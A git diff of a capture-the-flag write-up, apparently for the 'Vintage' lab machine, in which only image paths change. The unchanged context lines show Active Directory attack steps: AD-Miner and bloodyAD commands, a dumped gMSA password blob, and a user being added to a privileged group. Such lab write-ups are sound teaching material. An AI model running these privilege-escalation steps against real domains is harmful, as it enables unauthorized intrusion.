@@ -192,7 +192,7 @@ Using **AD-Miner** for a different view on potential attack paths
 AD-miner -u 'neo4j' -p 'exegol4thewin' -cf vintage
 ```
 
-![alt text](image_vintage/2024-12-01_07-59_adminer_pre2000.png)
+![alt text](../assets/image_vintage/2024-12-01_07-59_adminer_pre2000.png)
 
 Using **pre2k** like this :
 
@@ -210,7 +210,7 @@ We can retrieve the ccache of **FS01$**
 
 Now if we check on bloodhound we can see this 
 
-![alt text](image_vintage/2024-12-01_07-21_bloodhound_fs01.png)
+![alt text](../assets/image_vintage/2024-12-01_07-21_bloodhound_fs01.png)
 
 But first, what is **GMSA**
 
@@ -232,7 +232,7 @@ msDS-ManagedPassword.B64ENCODED: cAPhluwn4ijHTUTo7liDUp19VWhIi9/YDwdTpCWVnKNzxHW
 ```
 Looking again on **bloodhound**
 
-![alt text](image_vintage/2024-12-01_07-48_bloodhound_gmsa01.png)
+![alt text](../assets/image_vintage/2024-12-01_07-48_bloodhound_gmsa01.png)
 
 Now we can use **BloodyAD** again to add for example our initial user **P.Rosa**
 
@@ -254,7 +254,7 @@ LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\gMSA01$ fro
 bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d vintage.htb -k add groupMember 'servicemanagers' 'p.rosa'
 [+] p.rosa added to servicemanagers
 ```
-![alt text](image_vintage/2024-12-01_08-15_bloodhound_servicemanagers.png)
+![alt text](../assets/image_vintage/2024-12-01_08-15_bloodhound_servicemanagers.png)
 
 Now we have **GenericAll permissions** on three different **service accounts**
 
@@ -500,9 +500,9 @@ SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\c.neri_adm:
 
 If we look again on bloodhound, we can see this 
 
-![alt text](image_vintage/c_nerigroup.png)
+![alt text](../assets/image_vintage/c_nerigroup.png)
 
-![alt text](image_vintage/2024-12-01_17-42_bloodhound_delegated_admins.png)
+![alt text](../assets/image_vintage/2024-12-01_17-42_bloodhound_delegated_admins.png)
 
 Looks like a free win here
 
